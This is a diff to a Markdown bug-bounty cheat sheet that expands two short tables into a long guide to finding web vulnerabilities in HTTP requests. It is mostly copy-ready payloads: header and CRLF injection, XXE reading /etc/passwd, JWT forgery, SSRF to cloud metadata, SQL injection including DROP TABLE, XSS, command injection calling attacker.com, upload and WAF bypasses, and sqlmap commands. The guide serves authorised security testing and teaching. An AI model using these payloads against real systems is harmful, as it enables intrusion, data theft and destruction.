@@ -99,31 +99,388 @@ Body (only for some requests like POST)
 
 ---
 
-### **5. How to Spot Vulnerabilities in Requests**
+# Bug Bounty Cheat Sheet - How to Spot Vulnerabilities in Requests
 
-| **Header/Field**    | **What to Check For**                          | **Potential Vulnerability**                   |
-|---------------------|------------------------------------------------|-----------------------------------------------|
-| **Host**            | Try changing the Host to another domain.       | **Host Header Injection**, SSRF               |
-| **User-Agent**      | Modify to see if filters are bypassed.         | **WAF Bypass**                               |
-| **Authorization**   | Test with invalid or missing tokens.           | **Broken Authentication**                    |
-| **Referer/Origin**  | Change to see if CSRF protection exists.       | **CSRF Vulnerability**                       |
-| **Cookie**          | Modify session cookies to see if access changes.| **Session Hijacking**                        |
-| **Content-Type**    | Change from JSON to XML to trigger parsing issues.| **Content-Type Confusion**, **XXE**          |
+## HTTP Headers Analysis
 
----
+### Critical Headers to Test
 
-### **6. Status Codes in Responses (What the Server Says Back)**
+| Header | What to Check For | Potential Vulnerability | Test Examples |
+|--------|------------------|------------------------|---------------|
+| **Host** | Try changing to another domain | Host Header Injection, SSRF | `Host: evil.com` |
+| **User-Agent** | Modify to bypass filters | WAF Bypass | `User-Agent: <script>alert(1)</script>` |
+| **Authorization** | Test with invalid/missing tokens | Broken Authentication | Remove header, use expired tokens |
+| **Referer/Origin** | Change to test CSRF protection | CSRF Vulnerability | `Origin: https://attacker.com` |
+| **Cookie** | Modify session cookies | Session Hijacking | Change session IDs, role values |
+| **Content-Type** | Change from JSON to XML | Content-Type Confusion, XXE | `application/xml` instead of `application/json` |
+| **X-Forwarded-For** | Inject IPs to bypass restrictions | IP Spoofing, Rate Limit Bypass | `X-Forwarded-For: 127.0.0.1` |
+| **X-Real-IP** | Similar to X-Forwarded-For | IP Spoofing | `X-Real-IP: 192.168.1.1` |
+| **X-Originating-IP** | Test for IP whitelist bypass | Access Control Bypass | `X-Originating-IP: 10.0.0.1` |
 
-| **Code** | **Meaning**                  | **What to Do**                              |
-|----------|------------------------------|---------------------------------------------|
-| **200**  | OK (everything worked fine)  | Normal response. Test for hidden issues.    |
-| **301/302** | Redirect                  | Check for **Open Redirects** vulnerabilities.|
-| **400**  | Bad Request                  | Input might be wrong. Test with payloads.   |
-| **401**  | Unauthorized                 | Needs authentication. Test tokens.          |
-| **403**  | Forbidden                    | Access denied. Try bypass techniques.       |
-| **404**  | Not Found                    | Check if paths are hidden.                  |
-| **500**  | Internal Server Error        | Server-side issue. Might be **SQLi** or **LFI**.|
+### Header Injection Techniques
 
+```http
+# Host Header Injection
+GET / HTTP/1.1
+Host: target.com:evil.com
+Host: target.com%0d%0aSet-Cookie: malicious=true
+
+# Cache Poisoning via Host
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+# CRLF Injection
+GET / HTTP/1.1
+User-Agent: Mozilla%0d%0aSet-Cookie: admin=true
+```
+
+## HTTP Status Codes - What They Mean for Bug Hunters
+
+| Code | Meaning | What to Test | Potential Issues |
+|------|---------|--------------|------------------|
+| **200** | OK | Normal response | Test for hidden vulnerabilities in content |
+| **301/302** | Redirect | Check redirect destination | Open Redirects |
+| **400** | Bad Request | Input validation issues | SQLi, XSS, Command Injection |
+| **401** | Unauthorized | Authentication required | Token manipulation, bypass |
+| **403** | Forbidden | Access denied | Authorization bypass techniques |
+| **404** | Not Found | Resource doesn't exist | Directory traversal, hidden endpoints |
+| **405** | Method Not Allowed | HTTP method restricted | Try different methods (PUT, PATCH, DELETE) |
+| **429** | Too Many Requests | Rate limiting active | Rate limit bypass techniques |
+| **500** | Internal Server Error | Server-side error | SQLi, LFI, RFI, deserialization |
+| **502/503** | Bad Gateway/Unavailable | Proxy/load balancer issues | SSRF, backend system access |
+
+## Request Methods & Techniques
+
+### HTTP Method Testing
+```http
+# Test all methods on endpoints
+GET /admin HTTP/1.1
+POST /admin HTTP/1.1
+PUT /admin HTTP/1.1
+DELETE /admin HTTP/1.1
+PATCH /admin HTTP/1.1
+OPTIONS /admin HTTP/1.1
+HEAD /admin HTTP/1.1
+TRACE /admin HTTP/1.1
+
+# Method Override
+POST /admin HTTP/1.1
+X-HTTP-Method-Override: DELETE
+
+POST /admin HTTP/1.1
+_method=PUT
+```
+
+### Parameter Pollution
+```http
+# HTTP Parameter Pollution
+GET /search?query=safe&query=<script>alert(1)</script>
+
+# JSON Parameter Pollution
+{
+  "user": "admin",
+  "user": "guest",
+  "role": "user"
+}
+```
+
+## Content-Type Manipulation
+
+### Dangerous Content-Type Changes
+
+| Original | Change To | Potential Vulnerability |
+|----------|-----------|------------------------|
+| `application/json` | `application/xml` | XXE Injection |
+| `application/json` | `text/xml` | XXE Injection |
+| `application/x-www-form-urlencoded` | `application/json` | Logic flaws |
+| `multipart/form-data` | `application/json` | File upload bypass |
+| `text/plain` | `text/html` | XSS |
+
+### XXE Testing
+```http
+POST /api/user HTTP/1.1
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<user><name>&xxe;</name></user>
+```
+
+## Authentication & Authorization Testing
+
+### JWT Token Manipulation
+```bash
+# None algorithm attack
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+
+# Key confusion attack
+{
+  "alg": "HS256",  # Change from RS256
+  "typ": "JWT"
+}
+
+# Weak secret bruteforce
+hashcat -m 16500 jwt.txt rockyou.txt
+```
+
+### Session Testing
+```http
+# Session fixation
+Cookie: JSESSIONID=ATTACKER_CONTROLLED_VALUE
+
+# Session in URL
+GET /dashboard?sessionid=ABC123
+
+# Cookie manipulation
+Cookie: role=admin; isLoggedIn=true; userId=1
+```
+
+## SSRF Testing Techniques
+
+### Host Header SSRF
+```http
+GET / HTTP/1.1
+Host: 169.254.169.254  # AWS metadata
+Host: metadata.google.internal  # GCP metadata
+Host: 127.0.0.1:22  # Internal services
+```
+
+### URL Parameter SSRF
+```http
+# Common parameters
+GET /proxy?url=http://169.254.169.254/latest/meta-data/
+GET /fetch?target=file:///etc/passwd
+GET /redirect?next=gopher://127.0.0.1:11211/
+
+# Bypass techniques
+http://127.0.0.1
+http://localhost
+http://[::1]
+http://0x7f000001
+http://017700000001
+http://2130706433
+```
+
+## Input Validation Testing
+
+### SQL Injection Payloads
+```sql
+' OR '1'='1
+' UNION SELECT 1,2,3--
+'; DROP TABLE users;--
+' AND (SELECT SUBSTRING(@@version,1,1))='5'--
+```
+
+### XSS Payloads
+```javascript
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+<svg onload=alert('XSS')>
+```
+
+### Command Injection
+```bash
+; ls -la
+| whoami
+`id`
+$(whoami)
+& ping -c 4 attacker.com
+```
+
+## File Upload Testing
+
+### Dangerous Extensions
+```
+.php .jsp .asp .aspx .py .rb .pl .cgi
+.phtml .php3 .php4 .php5 .phar
+.svg .xml .html .swf
+```
+
+### Bypass Techniques
+```http
+# Double extension
+file.jpg.php
+
+# Null byte (historical)
+file.php%00.jpg
+
+# Content-Type manipulation
+Content-Type: image/jpeg
+(but upload PHP file)
+
+# Magic bytes manipulation
+GIF89a<?php phpinfo(); ?>
+```
+
+## Rate Limiting & WAF Bypass
+
+### Rate Limit Bypass
+```http
+# IP spoofing headers
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+
+# Distributed requests
+User-Agent: (rotate values)
+```
+
+### WAF Bypass Techniques
+```http
+# Case variation
+SELECT vs SeLeCt vs sElEcT
+
+# Comment insertion
+UNI/**/ON SE/**/LECT
+
+# Encoding
+%53%45%4C%45%43%54 (URL encoding)
+SELECT (HTML entity encoding)
+
+# Alternative representations
+' or 1=1# vs ' or 1 like 1#
+```
+
+## Advanced Testing Techniques
+
+### Race Conditions
+```python
+# Concurrent requests to test race conditions
+import threading
+import requests
+
+def make_request():
+    requests.post('/transfer', data={'amount': 1000, 'to': 'attacker'})
+
+threads = []
+for i in range(10):
+    t = threading.Thread(target=make_request)
+    threads.append(t)
+    t.start()
+```
+
+### Deserialization Testing
+```python
+# PHP Object Injection
+O:8:"stdClass":1:{s:4:"evil";s:10:"phpinfo();";}
+
+# Java Deserialization
+aced0005...  # Look for serialized Java objects
+
+# Python Pickle
+cos\nsystem\n(S'id'\ntR.  # Pickle payload
+```
+
+### GraphQL Testing
+```graphql
+# Introspection query
+query IntrospectionQuery {
+  __schema {
+    queryType { name }
+    mutationType { name }
+    types {
+      ...FullType
+    }
+  }
+}
+
+# Query depth attack
+query {
+  user {
+    posts {
+      comments {
+        user {
+          posts {
+            # ... deep nesting
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+## Response Analysis
+
+### Information Disclosure Signs
+```
+# Error messages revealing info
+SQL error: You have an error in your SQL syntax
+PHP Warning: include(/etc/passwd): failed to open stream
+Stack trace: at com.example.UserController.getUser(UserController.java:45)
+
+# Version disclosure
+Server: nginx/1.14.0
+X-Powered-By: PHP/7.2.0
+X-AspNet-Version: 4.0.30319
+```
+
+### Timing Attacks
+```python
+import time
+import requests
+
+# SQL injection time-based
+payload = "admin' AND (SELECT SLEEP(5))--"
+start = time.time()
+requests.post('/login', data={'username': payload})
+end = time.time()
+
+if end - start > 5:
+    print("Potential SQL injection!")
+```
+
+## Quick Testing Checklist
+
+### Every Request Should Be Tested For:
+- [ ] **Input validation** in all parameters
+- [ ] **Authentication bypass** techniques
+- [ ] **Authorization** level changes
+- [ ] **Content-Type** manipulation
+- [ ] **HTTP method** variations
+- [ ] **Header injection** possibilities
+- [ ] **Rate limiting** bypass
+- [ ] **Error message** information disclosure
+- [ ] **Redirect** manipulation
+- [ ] **File upload** vulnerabilities (if applicable)
+
+### Tools for Testing
+```bash
+# Burp Suite extensions
+- Param Miner
+- Autorize
+- Active Scan++
+- Backslash Powered Scanner
+
+# Command line tools
+ffuf -w wordlist.txt -u http://target.com/FUZZ
+sqlmap -u "http://target.com/page?id=1" --dbs
+nuclei -t cves/ -u http://target.com
+```
+
+### Common Bypass Patterns
+```
+# URL encoding
+%2e%2e%2f = ../
+%2500 = null byte
+
+# Unicode encoding
+\u002e\u002e\u002f = ../
+\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e = <script>
+
+# Case manipulation
+AdMiN instead of admin
+SeLeCt instead of SELECT
+```
+
+Remember: Always test on authorized targets only and follow responsible disclosure practices!
 ---
 
 ### **7. Tools You Can Use**
